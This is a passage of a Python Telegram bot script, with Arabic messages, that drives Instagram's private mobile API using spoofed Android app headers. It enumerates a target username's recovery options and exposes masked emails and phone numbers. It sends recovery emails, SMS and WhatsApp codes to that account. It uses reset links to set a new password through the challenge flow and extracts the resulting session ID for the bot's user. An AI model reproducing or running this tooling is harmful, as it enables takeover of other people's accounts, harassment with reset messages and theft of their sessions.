        url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
        headers = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }

        data = {
            "adid": str(uuid.uuid4()),
            "query": user,
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "waterfall_id": str(uuid.uuid4())
        }

        response = requests.post(url, headers=headers, data=data, timeout=10)
        if "email" in response.text or "email_masked" in response.text or "obfuscated_email" in response.text or "phone" in response.text:
            contact_info = extract_contact_info(response.text)
            if contact_info:
                return True, f"✅ الاتصال الرابع: تم إرسال رابط الاستعادة إلى: {contact_info}", contact_info
            else:
                return True, "✅ الاتصال الرابع: تم إرسال رابط الاستعادة.", None
        else:
            return False, "❌ الاتصال الرابع: لم يتم إرسال ريست.", None
    except Exception as e:
        return False, f"❌ الاتصال الرابع: خطأ في الإرسال - {str(e)}", None

# دوال الاتصال الجديد مع دعم الواتساب
def send_new_connection(username):
    try:
        url_target = "https://i.instagram.com/api/v1/users/lookup/"

        header_target = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }

        data_target = {
            "phone_id": str(uuid.uuid4()),
            "q": username,
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "android_build_type": "release",
            "waterfall_id": str(uuid.uuid4()),
            "directly_sign_in": "true",
            "is_wa_installed": "false"
        }

        req_target = requests.post(url=url_target, headers=header_target, data=data_target, timeout=10)
        
        if '"user":{"pk"' not in req_target.text:
            return {"success": False, "message": "الحساب غير موجود", "can_email": False, "can_sms": False, "can_whatsapp": False}
        
        response_text = req_target.text
        
        can_email = '"can_email_reset":true' in response_text
        can_sms = '"can_sms_reset":true' in response_text
        can_whatsapp = '"can_whatsapp_reset":true' in response_text or 'whatsapp' in response_text.lower()
        
        return {
            "success": True, 
            "message": "تم العثور على الحساب", 
            "can_email": can_email, 
            "can_sms": can_sms,
            "can_whatsapp": can_whatsapp
        }
        
    except Exception as e:
        return {"success": False, "message": f"خطأ في الاتصال: {str(e)}", "can_email": False, "can_sms": False, "can_whatsapp": False}

def send_new_connection_email(username):
    try:
        url_send_email = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"

        header_send_email = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }

        data_send_email = {
            "adid": str(uuid.uuid4()),
            "query": username,
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "waterfall_id": str(uuid.uuid4())
        }

        req_send_email = requests.post(url=url_send_email, headers=header_send_email, data=data_send_email, timeout=10)
        
        if "email" in req_send_email.text:
            try:
                email_data = req_send_email.json()
                email = email_data.get("email", "غير معروف")
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": email}
            except:
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": "تم الإرسال إلى الإيميل المسجل"}
        else:
            return {"success": False, "message": "فشل في إرسال رابط الاستعادة", "contact_info": None}
            
    except Exception as e:
        return {"success": False, "message": f"خطأ في الاتصال: {str(e)}", "contact_info": None}

def send_new_connection_phone(username):
    try:
        url_send_phone = "https://i.instagram.com/api/v1/users/lookup_phone/"

        header_send_phone = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }

        data_send_phone = {
            "supports_sms_code": "true",
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "query": username,
            "android_build_type": "release",
            "waterfall_id": str(uuid.uuid4()),
            "use_whatsapp": "false"
        }

        req_send_phone = requests.post(url=url_send_phone, headers=header_send_phone, data=data_send_phone, timeout=10)
        
        if "phone_number" in req_send_phone.text:
            try:
                phone_data = req_send_phone.json()
                phone_number = phone_data.get("phone_number", "غير معروف")
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": phone_number}
            except:
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": "تم الإرسال إلى الرقم المسجل"}
        else:
            return {"success": False, "message": "فشل في إرسال رابط الاستعادة", "contact_info": None}
            
    except Exception as e:
        return {"success": False, "message": f"خطأ في الاتصال: {str(e)}", "contact_info": None}

def send_new_connection_whatsapp(username):
    try:
        url_send_whatsapp = "https://i.instagram.com/api/v1/users/lookup_phone/"

        header_send_whatsapp = {
            'X-Ig-Www-Claim': '0',
            'X-Ig-Connection-Type': 'WIFI',
            'X-Ig-Capabilities': '3brTv10=',
            'X-Ig-App-Id': '567067343352427',
            'User-Agent': 'Instagram 219.0.0.12.117 Android (25/7.1.2; 240dpi; 1280x720; samsung; SM-G977N; beyond1q; qcom; en_US; 346138365)',
            'Accept-Language': 'en-US',
            'X-Mid': 'YjKpKwABAAEBChfhQ0jDY79zjPt4',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate'
        }

        data_send_whatsapp = {
            "supports_sms_code": "false",
            "guid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "query": username,
            "android_build_type": "release",
            "waterfall_id": str(uuid.uuid4()),
            "use_whatsapp": "true"
        }

        req_send_whatsapp = requests.post(url=url_send_whatsapp, headers=header_send_whatsapp, data=data_send_whatsapp, timeout=10)
        
        if "phone_number" in req_send_whatsapp.text or "whatsapp" in req_send_whatsapp.text.lower():
            try:
                whatsapp_data = req_send_whatsapp.json()
                phone_number = whatsapp_data.get("phone_number", "غير معروف")
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": f"واتساب: {phone_number}"}
            except:
                return {"success": True, "message": "تم الإرسال بنجاح", "contact_info": "تم الإرسال عبر واتساب"}
        else:
            return {"success": False, "message": "فشل في إرسال رابط الاستعادة عبر واتساب", "contact_info": None}
            
    except Exception as e:
        return {"success": False, "message": f"خطأ في الاتصال: {str(e)}", "contact_info": None}

def extract_contact_info(response_text):
    try:
        data = json.loads(response_text)
        if "obfuscated_email" in data:
            return data["obfuscated_email"]
        elif "email" in data:
            email = data["email"]
            if '@' in email:
                parts = email.split('@')
                username = parts[0]
                domain = parts[1]
                if len(username) > 2:
                    return username[0] + '*' * (len(username) - 2) + username[-1] + '@' + domain
                return email
    except:
        pass
    
    email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    match = re.search(email_pattern, response_text)
    if match:
        email = match.group(0)
        if '@' in email:
            parts = email.split('@')
            username = parts[0]
            domain = parts[1]
            if len(username) > 2:
                obfuscated = username[0] + '*' * (len(username) - 2) + username[-1] + '@' + domain
                return obfuscated
            else:
                return '*' * len(username) + '@' + domain
        return email
    
    return None

def change_password(Resurl, newpass):
    try:
        if "?" not in Resurl:
            return False, "❌ رابط الاستعادة غير صالح - لا يحتوي على معلمات ضرورية", None
            
        query_string = Resurl.split("?")[1]
        parsed = dict(urllib.parse.parse_qsl(query_string))
        
        required_params = ['uidb36', 'token']
        missing_params = []
        for param in required_params:
            if param not in parsed:
                missing_params.append(param)
        
        if missing_params:
            print(f"⚠️ المعلمات المفقودة: {missing_params}")
            
        mustafa_device_id = "android-" + str(uuid.uuid4()).replace("-", "")
        parsed['device_id'] = mustafa_device_id
        parsed['waterfall_id'] = str(uuid.uuid4())
        
        if 'c' not in parsed:
            parsed['c'] = "default"
        
        mustafa_headers = {
            'User-Agent': "Instagram 275.0.0.27.98 Android (29/10; 320dpi; 720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X692; Infinix-X692; mt6769; ar_EG; 458229219)",
            'x-ig-app-locale': "ar_EG",
            'x-ig-device-locale': "ar_EG",
            'x-ig-mapped-locale': "ar_AR",
            'x-pigeon-rawclienttime': str(int(uuid.uuid4().int % 1e10)),
            'x-ig-bandwidth-speed-kbps': "825.000",
            'x-ig-bandwidth-totalbytes-b': "2232833",
            'x-ig-bandwidth-totaltime-ms': "2963",
            'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
            'x-ig-www-claim': "0",
            'x-bloks-is-layout-rtl': "true",
            'x-ig-device-id': str(uuid.uuid4()),
            'x-ig-family-device-id': str(uuid.uuid4()),
            'x-ig-android-id': mustafa_device_id,
            'x-ig-timezone-offset': "10800",
            'x-fb-connection-type': "WIFI",
            'x-ig-connection-type': "WIFI",
            'x-ig-capabilities': "3brTv10=",
            'x-ig-app-id': "567067343352427",
            'priority': "u=3",
            'accept-language': "ar-EG, en-US",
            'x-mid': "aOfYmAABAAH7FEdgE72C-lY12PgZ",
            'ig-intended-user-id': "0",
            'x-fb-http-engine': "Liger",
            'x-fb-client-ip': "True",
            'x-fb-server-cluster': "True"
        }        
        
        mustafa_url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        print(f"📤 إرسال طلب إعادة تعيين إلى: {mustafa_url}")
        
        mustafa_response = requests.post(mustafa_url, data=parsed, headers=mustafa_headers, timeout=30)
        
        print(f"📥 استجابة إعادة التعيين: {mustafa_response.status_code}")
        
        if mustafa_response.status_code != 200:
            return False, f"❌ فشل في الاتصال بخادم إنستغرام - الرمز: {mustafa_response.status_code}", None
            
        try:
            res = mustafa_response.json()
        except:
            return False, "❌ استجابة غير صالحة من إنستغرام", None
        
        if "user_id" not in res or "cni" not in res or "nonce" not in res or "challenge_context" not in res:
            return False, "❌ رابط الاستعادة منتهي الصلاحية أو غير صالح", None
        
        mustafa_url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        mustafa_payload = {
            'user_id': res["user_id"],
            'cni': res["cni"],
            'nonce_code': res["nonce"],
            'bk_client_context': "{\"bloks_version\":\"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb\",\"styles_id\":\"instagram\"}",
            'challenge_context': res["challenge_context"],
            'bloks_versioning_id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
            'get_challenge': "true"
        }
        
        mustafa_response = requests.post(mustafa_url, data=mustafa_payload, headers=mustafa_headers, timeout=30)
        print(f"📥 استجابة التحدي: {mustafa_response.status_code}")
        
        if mustafa_response.status_code != 200:
            return False, f"❌ فشل في تحدي الأمان - الرمز: {mustafa_response.status_code}", None
        
        mustafa_timestamp = str(int(uuid.uuid4().int % 1e10))
        mustafa_url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        mustafa_payload = {
            'is_caa': "False",
            'source': "",
            'uidb36': parsed.get('uidb36', ''),
            'error_state': "{\"index\":0,\"type_name\":\"str\",\"state_id\":1885294272}",
            'afv': "",
            'cni': res["cni"],
            'token': "",
            'has_follow_up_screens': "0",
            'bk_client_context': "{\"bloks_version\":\"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb\",\"styles_id\":\"instagram\"}",
            'challenge_context': res["challenge_context"],
            'bloks_versioning_id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
            'enc_new_password1': f"#PWD_INSTAGRAM:0:{mustafa_timestamp}:{newpass}",
            'enc_new_password2': f"#PWD_INSTAGRAM:0:{mustafa_timestamp}:{newpass}"
        }        
        
        mustafa_headers.update({
            'x-pigeon-session-id': f"UFS-{str(uuid.uuid4())}",
            'x-pigeon-rawclienttime': mustafa_timestamp,
            'x-ig-nav-chain': "bloks_unknown_class:security_checkup_password_reset:11:warm_start:1760208169.38::",
            'Cookie': f"ig_did={str(uuid.uuid4()).upper()};"
        })
        
        mustafa_response = requests.post(mustafa_url, data=mustafa_payload, headers=mustafa_headers, timeout=30)
        print(f"📥 استجابة تغيير كلمة المرور: {mustafa_response.status_code}")
        
        mustafa_session = None        
        
        if 'ig-set-authorization' in mustafa_response.headers:
            try:
                mustafa_token = mustafa_response.headers['ig-set-authorization']
                token_parts = mustafa_token.split(":")
                if len(token_parts) >= 3:
                    session_data = base64.b64decode(token_parts[2])
                    session_json = json.loads(session_data)
                    mustafa_session = session_json.get("sessionid")
                    print(f"✅ تم استخراج الجلسة من الرأس: {mustafa_session}")
            except Exception as e:
                print(f"❌ خطأ في فك تشفير الجلسة من الرأس: {e}")
       
        if mustafa_response.status_code == 200:
            if mustafa_session and mustafa_session != "غير متوفر":
                mustafa_message = f"""✅ تم تغيير كلمة المرور بنجاح.

🔐 الجلسة:
<code>{mustafa_session}</code>

🔑 كلمة المرور الجديدة: {newpass}

📝 ملاحظة: يمكنك نسخ الجلسة بالنقر عليها"""
                return True, mustafa_message, mustafa_session
            else:
                mustafa_message = f"""✅ تم تغيير كلمة المرور بنجاح.

🔑 كلمة المرور الجديدة: {newpass}

⚠️ ملاحظة: تم تغيير كلمة المرور بنجاح ولكن لم نتمكن من استخراج الجلسة تلقائياً."""
                return True, mustafa_message, "غير متوفر"
        else:
            return False, f"❌ فشل في تغيير كلمة المرور - الرمز: {mustafa_response.status_code}", None
            
    except Exception as mustafa_error:
        mustafa_error_message = f"❌ حدث خطأ في العملية: {str(mustafa_error)}"       
        print(f"❌ خطأ عام: {mustafa_error}")
        return False, mustafa_error_message, None

def get_session_with_username(username, password):
    try:
        device_id = "android-" + str(uuid.uuid4()).replace("-", "")
        
        mustafa_url = "https://i.instagram.com/api/v1/accounts/login/"
        mustafa_timestamp = str(int(uuid.uuid4().int % 1e10))
        
        mustafa_payload = {
            'signed_body': f"SIGNATURE.{json.dumps({
                'jazoest': '22273',
                'country_codes': '[{\"country_code\":\"20\",{\"source\":[\"default\"]}]',
                'phone_id': str(uuid.uuid4()),
                'enc_password': f'#PWD_INSTAGRAM:0:{mustafa_timestamp}:{password}',
                'username': username,
                'adid': str(uuid.uuid4()),
                'guid': str(uuid.uuid4()),
                'device_id': device_id,
                'google_tokens': '[]',
                'login_attempt_count': '0'
            })}"
        }

        mustafa_headers = {
            'User-Agent': "Instagram 275.0.0.27.98 Android (29/10; 320dpi; 720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X692; Infinix-X692; mt6769; ar_EG; 458229219)",
            'x-ig-app-locale': "ar_EG",
            'x-ig-device-locale': "ar_EG",
            'x-ig-mapped-locale': "ar_AR",
            'x-ig-android-id': device_id,
            'x-ig-capabilities': "3brTv10=",
            'x-ig-app-id': "567067343352427",
        }
        
        print(f"🔐 محاولة تسجيل الدخول للمستخدم: {username}")
        mustafa_response = requests.post(mustafa_url, data=mustafa_payload, headers=mustafa_headers, timeout=30)
        print(f"📥 استجابة التسجيل: {mustafa_response.status_code}")
        
        if 'ig-set-authorization' in mustafa_response.headers:
            try:
                mustafa_token = mustafa_response.headers['ig-set-authorization']
                token_parts = mustafa_token.split(":")
                if len(token_parts) >= 3:
                    session_data = base64.b64decode(token_parts[2])
                    session_json = json.loads(session_data)
                    session_id = session_json.get("sessionid")
                    print(f"✅ تم استخراج الجلسة من التسجيل: {session_id}")
                    return session_id
            except Exception as e:
                print(f"❌ خطأ في فك تشفير الجلسة من التسجيل: {e}")
        
        try:
            response_json = mustafa_response.json()
            if 'logged_in_user' in response_json and 'sessionid' in response_json:
                return response_json['sessionid']
        except:
            pass
            
        return "غير متوفر"
    except Exception as e:
        print(f"❌ خطأ في تسجيل الدخول: {e}")
        return "غير متوفر"

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("rest", rest_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()